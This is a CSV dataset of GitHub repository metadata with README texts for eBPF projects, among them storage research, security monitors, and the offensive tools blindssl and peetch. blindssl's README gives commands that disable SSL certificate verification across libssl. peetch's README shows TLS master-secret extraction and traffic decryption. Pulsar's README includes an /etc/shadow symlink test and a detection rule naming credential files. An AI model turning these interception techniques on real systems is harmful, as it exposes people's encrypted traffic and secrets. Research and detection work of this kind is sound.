repo_slug,stars,forks,watchers,issues,language,description,created_at,updated_at,commits,readme_text
xrp-project/XRP,234,44,234,4,Shell,XRP: In-Kernel Storage Functions with eBPF,2022-04-06T06:29:07Z,2025-10-12T16:58:55Z,13,"# XRP: In-Kernel Storage Functions with eBPF

This repository contains source code and instructions to reproduce key results in the XRP paper (to appear in OSDI '22). A draft of the paper is added to this repository.

XRP requires a low latency NVMe SSD on which the overhead of the Linux storage stack is significant. We use Intel Optane SSD P5800X in all the experiments. We provide SSH access to a host equipped with P5800X for artifact reviewers. Reviewers can find the credential on HotCRP. We assume that the operating system is Ubuntu 20.04, and there are 6 physical CPU cores on the machine. Other configurations may require changing the scripts accordingly.

There are four major components:
* Modified Linux kernel (based on v5.12) that supports XRP
* BPF-KV: A simple key-value store using XRP to accelerate both point and range lookups
* Modified WiredTiger (based on v4.4.0) with XRP support
* My-YCSB: An efficient YCSB benchmark written in C++ for WiredTiger

There are also four specialized versions of BPF-KV. We use them to evaluate the performance of SPDK and io_uring with both closed-loop and open-loop load generators.

## Getting Started

First, clone this repository in a folder that is large enough to compile Linux kernel:
```
$> git clone https://github.com/xrp-project/XRP.git
$> cd XRP
```



Compile and install Linux kernel:

```
$> ./build_and_install_kernel.sh
```
This step will take some time since it needs to download the source code, install dependencies, and compile the kernel from scratch.



After the kernel is compiled and installed, you will be prompted to reboot into the XRP kernel:
```
$> sudo grub-reboot ""Advanced options for Ubuntu>Ubuntu, with Linux 5.12.0-xrp+""
$> sudo reboot
```
Note that other components can only be compiled when you are in the XRP kernel.



Then, build and install BPF-KV:
```
$> ./build_and_install_bpfkv.sh
```
There are some places in the specialized BPF-KV where we hardcoded the disk name at compile time. We assume `/dev/nvme0n1` is used as the storage device. If you want to choose another disk, you can specify it by `./build_and_install_bpfkv.sh [disk name(e.g., /dev/nvme1n1)]`. The test machine for reviewers can always use the default setting.

Run a simple BPF-KV test:
```
$> ./test_bpfkv.sh
```
Use `./test_bpfkv.sh [disk name]` if you need to specify a disk.



After that, compile and install both WiredTiger and My-YCSB:

```
$> ./build_and_install_wiredtiger.sh
$> ./build_and_install_ycsb.sh
```

Run a quick WiredTiger test:
```
$> ./test_wiredtiger.sh
```
Use `./test_wiredtiger.sh [disk name]` if you need to specify a disk.

## Claims and Key Results

Our modified Linux kernel includes the following parts:
* A new syscall `read_xrp`
* I/O request resubmission logic in the NVMe driver
* Metadata digest for ext4 logical-to-physical file offset translation
* A new BPF program type `BPF_PROG_TYPE_XRP`
* A new BPF hook in the NVMe driver
* An augmented BPF verifier to support XRP use cases while keeping the safty guarantees

However, our prototype also has some limitations: I/O request size is limited to 512 B, and fanout is not supported.

Here is a list of the key results in the paper:
* Table 3: Average latency of random lookup in BPF-KV
* Figure 5(a): 99-th percentile latency of BPF-KV with index depth 6
* Figure 5(b): 99.9-th percentile latency of BPF-KV with index depth 6
* Figure 5(c): Percentage of BPF-KV requests with latency â‰¥ 1 ms
* Figure 6(a): Single-threaded throughput of BPF-KV for varying I/O index depth
* Figure 6(b): Multi-threaded throughput of BPF-KV with index depth 3
* Figure 6(c): Multi-threaded throughput of BPF-KV with index depth 6
* Figure 7(a): Throughput of BPF-KV using a open-loop load generator
* Figure 7(b): Latency-throughput graph of BPF-KV
* Figure 8(a): Average latency of range query in BPF-KV
* Figure 8(b): Throughput of range query in BPF-KV
* Figure 9(a): Throughput of WiredTiger for varying client threads
* Figure 9(b): Throughput of WiredTiger for varying cache size
* Figure 10(a): Throughput speedup of WiredTiger for varying skewness
* Figure 10(b): 99-th percentile latency of WiredTiger

The motivation graphs and numbers in the introduction section and the motivation section are out of the scope of this repository. They are already published in the HotOS '21 paper [BPF for storage: an exokernel-inspired approach](https://dl.acm.org/doi/10.1145/3458336.3465290). The source code for the HotOS '21 paper is also available: https://github.com/yuhong-zhong/bpf-storage-hotos.

## Instructions to Reproduce Key Results

For every experiment, there is a corresponding folder in the `evaluation` directory. You can run the full-length experiment by `./run_full_exp.sh` or only run a partial experiment by `./run_single_exp.sh`. To choose a disk other than `/dev/nvme0n1`, run `./run_full_exp.sh [disk name]` instead (not required on the test machine for reviewers). After running the experiment, all the raw results will be stored in the `result` folder within each experiment directory. Figures and tables can be generated using the `plot_*.py` and `get_*.py` Python scripts in each experiment folder.

Since some full-length experiments can take a few hours to finish, we recommend running partial experiments by `./run_single.exp.sh` first. For example, if you want to reproduce a specific data point in a figure or a table, you can find the corresponding experiment folder and run `./run_single_exp.sh` in it without any argument. This will print the list of required parameters for this partial experiment. Then, you can run this script again with the arguments that describe the setting of that data point. After the experiment is done, you can check out the raw result in the `result` folder. Note that even `./run_single_exp.sh` can take more than 20 minutes to finish.

For the full-length experiments, each BPF-KV experiment usually terminates within one hour, while each WiredTiger experiment may need at least a few hours to finish.

Loading data into a new WiredTiger database is very time consuming. Therefore, we provide a pre-loaded WiredTiger database at `/tigerhome` on the test server. The scripts for WiredTiger experiments will copy the pre-loaded database automatically instead of creating a new one from scratch if it presents. We encourage others to also create a pre-loaded database for WiredTiger in advance. You can make a copy of the database left behind by YCSB C workload since it is read-only.
"
Exein-io/pulsar,978,61,978,23,Rust,"A modular and blazing fast runtime security tool for the IoT, powered by eBPF.",2022-06-18T15:38:05Z,2025-10-11T15:58:14Z,674,"<div align=""center"">
  <img width=""300"" src=""assets/pulsar-logo-black.png#gh-light-mode-only"" alt=""Pulsar dark logo"">
  <img width=""300"" src=""assets/pulsar-logo-white.png#gh-dark-mode-only"" alt=""Pulsar light logo"">

  <p>
    <a href=""https://github.com/exein-io/pulsar/actions/workflows/release.yaml"">
      <img src=""https://github.com/exein-io/pulsar/actions/workflows/release.yaml/badge.svg?branch=main"" alt=""Release"">
    </a>
    <a href=""https://discord.gg/ZrySDqhBtZ""><img src=""https://img.shields.io/discord/986983233256321075?color=%2331c753&logo=discord"">
    <a href=""https://opensource.org/licenses/Apache-2.0"">
      <img src=""https://img.shields.io/badge/License-Apache_2.0-blue.svg"" alt=""License"">
      <img src=""https://img.shields.io/badge/License-GPL--2.0-blue.svg"" alt=""License"">
    </a>
  </p>
</div>

Pulsar is a security tool for monitoring the activity of Linux devices at runtime, powered by [eBPF](https://ebpf.io/). 

The Pulsar core modules use eBPF probes to collect events from the kernel in a safe and efficient way. Pulsar events can be categorized in the four main following areas:

- **Processes**: processes information, including file execution and file opening.
- **File I/O**: I/O operations on disk and memory.
- **Network**: data from the network stack.

Pulsar is built with a modular design that makes it easy to adapt the core architecture to new use cases, create new modules or write custom rules.

## Quickstart

> **Warning**  
> A kernel 5.5 or higher with BPF and BTF enabled is required. Visit the official Pulsar website for the full [requirements](https://pulsar.sh/docs/faq/kernel-requirements/) and [installation options](https://pulsar.sh/docs/getting-started/installation) available.

To download and install Pulsar, run the following in your terminal:

```sh
curl --proto '=https' --tlsv1.2 -LsSf https://github.com/exein-io/pulsar/releases/latest/download/pulsar-install.sh | sh
```

Launch the pulsar daemon in a terminal **with administrator privileges**:

```sh
pulsard
```

That's pretty much it. At this point Pulsar is actively monitoring the activity of all the target processes, and checking it against the set of security policies defined in the rules file. You can test this by triggering a threat event, for example running the following command in another terminal:

```sh
ln -s /etc/shadow /tmp/secret
```

In the pulsar terminal you should see something similar to:

```console
[2023-02-07T14:29:09Z  THREAT  /usr/bin/ln (36267)] [rules-engine - { rule_name = ""Create sensitive files symlink"" }] File Link { source: /tmp/secret, destination: /etc/shadow, hard_link: false }
```

As you can see Pulsar identifies the previous command as a threat event.

### How does it work?

Behind the scenes, when an application performs an operation, it gets intercepted at kernel level by the Pulsar BPF probes, turned into a unique event object and sent to the userspace. There, the Pulsar rule engine processes the event against the set of rules defined in the rules file and, if there is a match, it emits a new event, marked as a threat. Finally a logger module prints threat events to the terminal.

In the example above, the event produced matched the following rule:

```yaml
- name: Create sensitive files symlink
  type: FileLink
  condition: (payload.destination IN [""/etc/shadow"", ""/etc/sudoers"", ""/etc/pam.conf"", ""/etc/security/pwquality.conf""] OR payload.destination STARTS_WITH ""/etc/sudoers.d/"" OR payload.destination STARTS_WITH ""/etc/pam.d"") AND payload.hard_link == ""false""
```

## Installation

### (Recommended) Using the official installation script

The recommended approach to getting started with Pulsar is by using the official installations script. Follow the guide in the [Quickstart](#quickstart) section.

### Use Pre-built Binaries

Another approach to install Pulsar is by using a pre-built binary. Binaries are available for the [latest release](https://github.com/exein-io/pulsar/releases/latest). Use `pulsar-exec` for x86-64 (`pulsar-exec-static` for a static build) or `pulsar-exec-static-aarch64` for AArch64 platform. Using there approach you also need to download and setup the [helper scripts](./scripts) to have a more convenient way to start in daemon/cli mode.

### Build from source

We do not recommend build Pulsar from source. Building from source is only necessary if you wish to make modifications. If you want to play with the source code check the [Developers](https://pulsar.sh/docs/category/developers) section of the documentation.

## Resources

- [Read the docs](https://pulsar.sh/docs): understand how to install and set up Pulsar.
- [Concepts](https://pulsar.sh/docs/category/concepts): dive deep into Pulsar architecture and main concepts.
- [Tutorials](https://pulsar.sh/docs/category/tutorials): learn how to use Pulsar with practical examples.
- [Develop new eBPF modules](https://pulsar.sh/docs/developers/tutorials/create-ebpf-probe-module): build new eBPF probes and integrate them into Pulsar through the modules system;
- [Roadmap](https://github.com/orgs/exein-io/projects/14): check out the plan for next Pulsar releases;
- [Support](https://discord.gg/MQgaTPef7a): join the Discord server for community support.

## Contributing

If you're interested in contributing to Pulsar â€” thank you!

We have a [contributing guide](CONTRIBUTING.md) which will help you getting involved in the project. Also check the [Developers](https://pulsar.sh/docs/category/developers) section of the documentation for more information on Pulsar development.

## Community

Join the Pulsar [Discord server](https://discord.gg/MQgaTPef7a) to chat with developers, maintainers, and the whole community. You can also drop any question about Pulsar on the official [GitHub discussions](https://github.com/exein-io/pulsar/discussions) or use the [GitHub issues](https://github.com/exein-io/pulsar/issues) for feature requests and bug reports.

## License

Pulsar is [licensed](./LICENSE) under two licenses â€” Pulsar userspace code is licensed under [APACHE-2.0](./LICENSES/LICENSE-APACHE-2.0). Pulsar eBPF probes are licensed under [GPL-2.0](./LICENSES/LICENSE-GPL-2.0).
"
citronneur/blindssl,48,5,48,2,C,Disable SSL certificate verification for all binaries that use libssl,2022-07-15T08:16:58Z,2025-10-04T14:00:46Z,2,"# blindssl -- Disable SSL certificate verification using eBPF

:warning: Works for all binaries that was linked with libssl dynamically (very few) :warning:

![Demo](.img/demo.gif)

## How to launch?

`blindssl` is built as a static binary without any dependencies, and available on the [release](https://github.com/citronneur/blindssl/releases/) page.

```
Usage: blindssl [OPTION...]
blindssl

Uses eBPF to hijack libssl peer certificate verification

USAGE: ./blinssl -p $(/usr/sbin/ldconfig -p | grep libssl.so | cut -d ' ' -f4)
-d /var/log/trace.0

  -d, --daemon               Start blindssl in daemon mode
  -p, --path=PATH            Path to the libssl.so file
  -v, --verbose              Verbose mode
  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version

Mandatory or optional arguments to long options are also mandatory or optional
for any corresponding short options.

Report bugs to .

```

As `blindssl` rely on libssl, we have to set the path where libssl is installed on your distribution. To find where libssl is installed you can run the following command :

```
> /usr/sbin/ldconfig -p | grep libssl.so | cut -d ' ' -f4
/lib/x86_64-linux-gnu/libssl.so.1.1
```

Once you get the path you can launch `blindssl` :

```
> ./blindssl -p /lib/x86_64-linux-gnu/libssl.so.1.1
```

An easy way to launch `blindssl` is to use the following command :

```
> ./blindssl -p $(/usr/sbin/ldconfig -p | grep libssl.so | cut -d ' ' -f4)
```

`blindssl` can also be started as a daemon by providing an output file where credentials will be written:

```
./blindssl -p $(/usr/sbin/ldconfig -p | grep libssl.so | cut -d ' ' -f4) -d
```

## How to build?

To build the static binary, we need third-party program. For eBPF we need `clang` to compile the C code into eBPF CO-RE code.
We also rely on `bpftool` to create a skeleton from ebpf program to include it in our userland program. Then we need also `libelf` to find the correct symbol in libpam.

```
sudo apt install make clang-11 gcc libelf-dev bpftool
```

Then just build!

```
git clone https://github.com/citronneur/blindssl --recursive
cd blindssl/src
make
```

## How does It works?

`blindssl` will load userland probes eBPF program to hook
* `SSL_new` function from `libssl.so` to force the verify mode to `SSL_VERIFY_NONE`
* `SSL_get_verify_result` function that will overite the error code to set it to zero (everything is fine!)

This is a PoC with almost very few binaries as target, and just to show the power of eBPF !!!"
quarkslab/peetch,207,18,207,1,Python,An eBPF playground,2022-05-18T20:26:07Z,2025-10-07T09:08:31Z,34,"# peetch

`peetch` is a collection of tools aimed at experimenting with different aspects of eBPF to bypass TLS protocol protections.

Currently, peetch includes three subcommands. The first called `dump` aims to sniff network traffic by associating information about the source process with each packet. The second called `tls` allows identifying processes using OpenSSL to extract cryptographic keys. The third one `proxy` automatically intercepts TLS traffic from processes using OpenSSL and decrypts messages on the fly.

Combined, the first two commands make it possible to decrypt TLS exchanges recorded in the PCAPng format.

## Installation

`peetch` relies on several dependencies including [bcc](https://github.com/iovisor/bcc) and [Scapy](https://github.com/secdev/scapy). A Docker image can be easily built in order to easily test `peetch` using the following command:

```shell
docker build -t quarkslab/peetch .
```

## Commands Walk Through

The following examples assume that you used the following command to enter the Docker image and launch examples within it:

```shell
docker run --privileged --network host --mount type=bind,source=/sys,target=/sys --mount type=bind,source=/proc,target=/proc --pid host --rm -it quarkslab/peetch
```

### `dump`

This sub-command gives you the ability to sniff packets using an eBPF TC classifier and to retrieve the corresponding PID and process names with:

```shell
peetch dump
curl/1289291 - Ether / IP / TCP 10.211.55.10:53052 > 208.97.177.124:https S / Padding
curl/1289291 - Ether / IP / TCP 208.97.177.124:https > 10.211.55.10:53052 SA / Padding
curl/1289291 - Ether / IP / TCP 10.211.55.10:53052 > 208.97.177.124:https A / Padding
curl/1289291 - Ether / IP / TCP 10.211.55.10:53052 > 208.97.177.124:https PA / Raw / Padding
curl/1289291 - Ether / IP / TCP 208.97.177.124:https > 10.211.55.10:53052 A / Padding
```

Note that as of today, `dump` will only capture IPv4 based TCP segments.

For convenience, the captured packets can be store to PCAPng along with process information using `--write`:

```shell
peetch dump --write peetch.pcapng
^C
```

This PCAPng can easily be manipulated with Wireshark or Scapy:

```python
scapy
>>> l = rdpcap(""peetch.pcapng"")
>>> l[0]
<Ether  dst=00:1c:42:00:00:18 src=00:1c:42:54:f3:34 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=60 id=11088 flags=DF frag=0 ttl=64 proto=tcp chksum=0x4bb1 src=10.211.55.10 dst=208.97.177.124 |<TCP  sport=53054 dport=https seq=631406526 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0xc3e9 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (1272423534, 0)), ('NOP', None), ('WScale', 7)] |<Padding  load='\x00\x00' |>>>>
>>> l[0].comment
b'curl/1289909'
```

### `tls`

This sub-command aims to identify processes that uses OpenSSL and makes it easy to dump several things like plaintext and secrets.

By default, `peetch tls` will only display one line per process, the `--directions` argument makes it possible to display the exchanged messages:

```shell
peetch tls --directions
<- curl (1291078) 208.97.177.124/443 TLS1.2 ECDHE-RSA-AES128-GCM-SHA256
-> curl (1291078) 208.97.177.124/443 TLS1.2 ECDHE-RSA-AES128-GCM-SHA256
```

Displaying OpenSSL buffer content is achieved with `--content`.

```shell
peetch tls --content
<- curl (1290608) 208.97.177.124/443 TLS1.2 ECDHE-RSA-AES128-GCM-SHA256

   0000  47 45 54 20 2F 20 48 54 54 50 2F 31 2E 31 0D 0A  GET / HTTP/1.1..
   0010  48 6F 73 74 3A 20 77 77 77 2E 70 65 72 64 75 2E  Host: www.perdu.
   0020  63 6F 6D 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A  com..User-Agent:
   0030  20 63 75 72 6C 2F 37 2E 36 38 2E 30 0D 0A 41 63   curl/7.68.0..Ac

-> curl (1290608) 208.97.177.124/443 TLS1.2 ECDHE-RSA-AES128-GCM-SHA256

   0000  48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D  HTTP/1.1 200 OK.
   0010  0A 44 61 74 65 3A 20 54 68 75 2C 20 31 39 20 4D  .Date: Thu, 19 M
   0020  61 79 20 32 30 32 32 20 31 38 3A 31 36 3A 30 31  ay 2022 18:16:01
   0030  20 47 4D 54 0D 0A 53 65 72 76 65 72 3A 20 41 70   GMT..Server: Ap
```

The `--secrets` arguments will display TLS Master Secrets extracted from memory. The following example leverages `--write` to write master secrets to simplify decrypting TLS messages with Scapy:

```shell
(sleep 5; curl https://www.perdu.com/?name=highly%20secret%20information --tls-max 1.2 --http1.1 --tlsv1.2) &

peetch tls --write &
curl (1293232) 208.97.177.124/443 TLS1.2 ECDHE-RSA-AES128-GCM-SHA256

peetch dump --write traffic.pcapng
^C

# Add the master secret to a PCAPng file
editcap --inject-secrets tls,1293232-master_secret.log traffic.pcapng traffic-ms.pcapng

scapy
>>> load_layer(""tls"")
>>> conf.tls_session_enable = True
>>> l = rdpcap(""traffic-ms.pcapng"")
>>> l[13][TLS].msg
[<TLSApplicationData  data='GET /?name=highly%20secret%20information HTTP/1.1\r\nHost: www.perdu.com\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n' |>]
```

### `proxy`

This sub-command uses eBPF programs to automatically intercept TLS traffic from processes using OpenSSL and decrypt messages on the fly using Scapy.

In the following example, `peetch proxy` display a secret value sent to a server by the `openssl` process.

```shell
peetch proxy
[-] Proxying OpenSSL traffic
[+] Intercepting traffic from openssl/451255 to 172.67.133.176/443 via 127.0.0.1/58039
    --> 127.0.0.1:58039 > 172.67.133.176:https tcp
    <-- 172.67.133.176:https > 127.0.0.1:58039 tcp
    --> 127.0.0.1:58039 > 172.67.133.176:https tcp
    <-- 172.67.133.176:https > 127.0.0.1:58039 tcp
    --> 127.0.0.1:58039 > 172.67.133.176:https tcp
    --> 127.0.0.1:58039 > 172.67.133.176:https tcp

###[ TLS Application Data ]###
  data      = b'GET /?secret=9590 HTTP/1.1\r\nHost: www.perdu.com\r\n\r\n\n'
```

## Limitations

By design, `peetch` only supports OpenSSL, IPv4 and TLS 1.2.
"
Flowmill/flowmill-collector,81,10,81,0,C++,,2021-03-28T18:40:33Z,2024-06-06T18:13:42Z,124,"# This repository has been archived #

The code is now part of OpenTelemetry. 

At the time of archiving, the authoritative repository is [open-telemetry/opentelemetry-ebpf](https://github.com/open-telemetry/opentelemetry-ebpf).
"
redhat-et/bpfd,685,69,685,22,Rust,An eBPF Manager for Linux and Kubernetes,2021-12-02T16:58:58Z,2025-10-11T16:10:31Z,2526,"![bpfman logo](./docs/img/horizontal/color/bpfman-horizontal-color.png) <!-- markdownlint-disable-line first-line-heading -->

# bpfman: An eBPF Manager

[![License][apache2-badge]][apache2-url]
[![License][bsd2-badge]][bsd2-url]
[![License][gpl-badge]][gpl-url]
![Build status][build-badge]
[![Book][book-badge]][book-url]
[![Netlify Status][netlify-badge]][netlify-url]
[![Copr build status][copr-badge]][copr-url]
[![OpenSSF Scorecard][openssf-badge]][openssf-url]
[![OpenSSF Best Practices][openssf-best-practices-badge]][openssf-best-practices-url]
[![FOSSA Status][fossa-badge]][fossa-url]
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/bpfman/bpfman)

[apache2-badge]: https://img.shields.io/badge/License-Apache%202.0-blue.svg
[apache2-url]: https://opensource.org/licenses/Apache-2.0
[bsd2-badge]: https://img.shields.io/badge/License-BSD%202--Clause-orange.svg
[bsd2-url]: https://opensource.org/licenses/BSD-2-Clause
[gpl-badge]: https://img.shields.io/badge/License-GPL%20v2-blue.svg
[gpl-url]: https://opensource.org/licenses/GPL-2.0
[build-badge]: https://img.shields.io/github/actions/workflow/status/bpfman/bpfman/build.yml?branch=main
[book-badge]: https://img.shields.io/badge/read%20the-book-9cf.svg
[book-url]: https://bpfman.io/
[copr-badge]: https://copr.fedorainfracloud.org/coprs/g/ebpf-sig/bpfman-next/package/bpfman/status_image/last_build.png
[copr-url]: https://copr.fedorainfracloud.org/coprs/g/ebpf-sig/bpfman-next/package/bpfman/
[netlify-badge]: https://api.netlify.com/api/v1/badges/557ca612-4b7f-480d-a1cc-43b453502992/deploy-status
[netlify-url]: https://app.netlify.com/sites/bpfman/deploys
[openssf-badge]: https://api.scorecard.dev/projects/github.com/bpfman/bpfman/badge
[openssf-url]: https://scorecard.dev/viewer/?uri=github.com/bpfman/bpfman
[openssf-best-practices-badge]: https://www.bestpractices.dev/projects/10169/badge
[openssf-best-practices-url]: https://www.bestpractices.dev/projects/10169
[fossa-badge]: https://app.fossa.com/api/projects/git%2Bgithub.com%2Fbpfman%2Fbpfman.svg?type=shield
[fossa-url]: https://app.fossa.com/projects/git%2Bgithub.com%2Fbpfman%2Fbpfman?ref=badge_shield

_Formerly know as `bpfd`_

bpfman is a Cloud Native Computing Foundation Sandbox project

<picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://raw.githubusercontent.com/cncf/artwork/main/other/cncf/horizontal/white/cncf-white.png""/>
   <source media=""(prefers-color-scheme: light)"" srcset=""https://raw.githubusercontent.com/cncf/artwork/main/other/cncf/horizontal/color/cncf-color.png""/>
   <img alt=""CNCF Logo"" src=""https://raw.githubusercontent.com/cncf/artwork/main/other/cncf/horizontal/color/cncf-color.png"" width=""200px""/>
</picture>

## Welcome to bpfman

bpfman operates as an eBPF manager, focusing on simplifying the deployment and administration of eBPF programs. Its notable features encompass:

- **System Overview**: Provides insights into how eBPF is utilized in your system.
- **eBPF Program Loader**: Includes a built-in program loader that supports program cooperation for XDP and TC programs, as well as deployment of eBPF programs from OCI images.
- **eBPF Filesystem Management**: Manages the eBPF filesystem, facilitating the deployment of eBPF applications without requiring additional privileges.

Our program loader and eBPF filesystem manager ensure the secure deployment of eBPF applications.
Furthermore, bpfman includes a Kubernetes operator, extending these capabilities to Kubernetes.
This allows users to confidently deploy eBPF through custom resource definitions across nodes in a cluster.

Here are some links to help in your bpfman journey (all links are from the bpfman website <https://bpfman.io/>):

- [Welcome to bpfman](https://bpfman.io/) for overview of bpfman.
- [Quick Start](https://bpfman.io/main/quick-start) for a quick installation of bpfman without having to download or
  build the code from source.
  Good for just getting familiar with bpfman and playing around with it.
- [Deploying Example eBPF Programs On Local Host](https://bpfman.io/main/getting-started/example-bpf-local/)
  for some examples of running `bpfman` on local host and using the CLI to install
  eBPF programs on the host.
- [Deploying Example eBPF Programs On Kubernetes](https://bpfman.io/main/getting-started/example-bpf-k8s/)
  for some examples of deploying eBPF programs through `bpfman` in a Kubernetes deployment.
- [Setup and Building bpfman](https://bpfman.io/main/getting-started/building-bpfman/) for instructions
  on setting up your development environment and building bpfman.
- [Example eBPF Programs](https://bpfman.io/main/getting-started/example-bpf/) for some
  examples of eBPF programs written in Go, interacting with `bpfman`.
- [Deploying the bpfman-operator](https://bpfman.io/main/getting-started/develop-operator/) for details on launching
  bpfman in a Kubernetes cluster.
- [Meet the Community](https://bpfman.io/main/governance/meetings/) for details on community meeting details.

## Issues

Would you like to report a bug? Feel free to [add an issue](https://github.com/bpfman/bpfman/issues).

Would you like to start a conversation on a specific topic? Please, [open a discussion](https://github.com/bpfman/bpfman/discussions).

## License

With the exception of eBPF code, everything is distributed under the terms of
the [Apache License] (version 2.0).

[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fbpfman%2Fbpfman.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fbpfman%2Fbpfman?ref=badge_large)

### eBPF

All eBPF code is distributed under either:

- The terms of the [GNU General Public License, Version 2] or the
  [BSD 2 Clause] license, at your option.
- The terms of the [GNU General Public License, Version 2].

The exact license text varies by file. Please see the SPDX-License-Identifier
header in each file for details.

Files that originate from the authors of bpfman use
`(GPL-2.0-only OR BSD-2-Clause)` - for example the [TC dispatcher] or our
own example programs.

Files that were originally created in [libxdp] use `GPL-2.0-only`.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this project by you, as defined in the GPL-2 license, shall be
dual licensed as above, without any additional terms or conditions.

[Apache license]: LICENSE-APACHE
[GNU General Public License, Version 2]: LICENSE-GPL2
[BSD 2 Clause]: LICENSE-BSD2
[libxdp]: https://github.com/xdp-project/xdp-tools
[TC dispatcher]:https://github.com/bpfman/bpfman/blob/main/bpf/tc_dispatcher.bpf.c

## Star History

<a href=""https://star-history.com/#bpfman/bpfman&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=bpfman/bpfman&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=bpfman/bpfman&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=bpfman/bpfman&type=Date"" />
 </picture>
</a>
"
evilsocket/ebpf-process-anomaly-detection,133,17,133,0,Python,Process behaviour anomaly detection using eBPF and unsupervised-learning Autoencoders,2022-08-15T13:49:11Z,2025-09-09T22:45:28Z,7,"Process behaviour anomaly detection using eBPF system call tracing and unsupervised learning Autoencoders.

[Read this blog post for a complete description of the project](https://www.evilsocket.net/2022/08/15/Process-behaviour-anomaly-detection-using-eBPF-and-unsupervised-learning-Autoencoders/).

## Installation

```sh
sudo pip3 install -r requirements.txt
```

## Learning

During the first step, we need to sample as much data as possible from a running target process (pid 1234 in this example):

```sh
sudo ./main.py --pid 1234 --data activity.csv --learn
```

Keep the sampling going while you trigger normal behaviour in the target process, this will generate the `activity.csv` file for training.

## Training a model

We'll now train a model to detect anomalies:

```sh
./main.py --data activity.csv --model model.h5 --train
```

The autoencoder saved to `model.h5` can now be used for anomaly detection with the error threshold print at the end of the training.

## Anomaly detection

Once the model has been trained it can be used on the target process to detect anomalies, in this case we're using a 10.0 error threshold:

```sh
sudo ./main.py --pid 1234 --model model.h5 --max-error 10.0 --run
```

When an anomaly is detected the cumulative error will be printed along wiht the top 3 anomalous system calls:

```
error = 30.605255 - max = 10.000000 - top 3:
  b'getpriority' = 0.994272
  b'writev' = 0.987554
  b'creat' = 0.969955
```

## License

This project is made with â™¥  by [@evilsocket](https://twitter.com/evilsocket) and it is released under the GPL3 license.
"
eeriedusk/knockles,236,18,236,0,C,eBPF Port Knocking Tool,2022-08-09T13:50:48Z,2025-10-01T09:40:18Z,4,"> **Warning**
> This git repository was meant to be a small (and fun) demonstration of what can be done with eBPF. It was clearly over-engineered as it was not developped nor optimized for any kind of use.

# Knockles - eBPF Port Knocking Tool ðŸšªðŸ

Knockles, is a port knocking tool based on [eBPF](https://ebpf.io/what-is-ebpf) ðŸ.
It allows to remotely open a TCP connection while being completely invisible to port scanners.

- A single SYN request is sent on an opened || closed port ðŸ“¨ ðŸ“«
- It carries an OTP for authentication so you can be the only one to open a port ðŸ” 
- Once authentified, a random (HMAC based) port is opened for a TCP connection ðŸŽ²
- Then, the port is closed as soon as a connection has been established ðŸšª

## Server configuration

> Modify the following macros/variables

```
./knockles/src/knockles.bpf.c
```
- `PORT`: Port monitored for knocks *[default: `80`]*

```
./knockles/src/knockles.c
```
- `HMAC_DURATION`: Time range between two different OTP (in seconds) *[default: `30`]*
- `LISTENING_DURATION`: Timeout of the opened port if no connection occurs (in seconds) *[default: `30`]*
- `SECRET`: HMAC secret key *[default: `MY_SECRET_KEY`]*

## Server compilation

### Requirements

#### Debian

```bash
sudo apt install git make pkg-config libelf-dev clang-11 libc6-dev-i386 bpftool libssl-dev -y
pip install scapy
```

#### Ubuntu

```bash
sudo apt install git make pkg-config libelf-dev clang-11 libc6-dev-i386 linux-tools-common linux-tools-$(uname -r) libssl-dev -y
pip install scapy
```

### Build

```bash
cd ./knockles/src
make
```

## Usage

### Server side

```text
Usage: ./knockles [OPTION]...
eBPF port knocking tool - Server.
      --help             display this help and exit
      --daemon           run program as daemon
```

### Client side

```text
usage: knuckknock.py [-h] -s KEY  -t TIME -d IP -p PORT

eBPF port knocking tool - Client.

optional arguments:
  -h, --help            show this help message and exit
  -s KEY , --secret KEY 
                        HMAC secret key
  -t TIME, --time TIME  generated HMAC duration
  -d IP, --dst IP       destination IP address
  -p PORT, --port PORT  monitored port
```
"
Gui774ume/krie,183,21,183,1,C,Linux Kernel Runtime Integrity with eBPF,2022-03-28T08:33:44Z,2025-09-25T18:25:44Z,30,"## KRIe

[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

KRIe is a research project that aims to detect Linux Kernel exploits with eBPF. KRIe is far from being a bulletproof strategy: from eBPF related limitations to post exploitation detections that might rely on a compromised kernel to emit security events, it is clear that a motivated attacker will eventually be able to bypass it.
That being said, the goal of the project is to make attackers' lives harder and ultimately prevent out-of-the-box exploits from working on a vulnerable kernel.

KRIe has been developed using [CO-RE (Compile Once - Run Everywhere)](https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html) so that it is compatible with a large range of kernel versions. If your kernel doesn't export its BTF debug information, KRIe will try to download it automatically from [BTFHub](https://github.com/aquasecurity/btfhub). If your kernel isn't available on BTFHub, but you have been able to manually generate your kernel's BTF data, you can provide it in the configuration file (see below).

### System requirements

This project was developed on Ubuntu Focal 20.04 (Linux Kernel 5.15) and has been tested on older releases down to Ubuntu Bionic 18.04 (Linux Kernel 4.15).

- golang 1.18+
- (optional) Kernel headers are expected to be installed in `lib/modules/$(uname -r)`, update the `Makefile` with their location otherwise.
- (optional) clang & llvm 14.0.6+

Optional fields are required to recompile the eBPF programs.

### Build

1) Since KRIe was built using CORE, you shouldn't need to rebuild the eBPF programs. That said, if you want still want to rebuild the eBPF programs, you can use the following command:

```shell script
# ~ make build-ebpf
```

2) To build KRIE, run:

```shell script
# ~ make build
```

3) To install KRIE (copy to /usr/bin/krie) run:
```shell script
# ~ make install
```

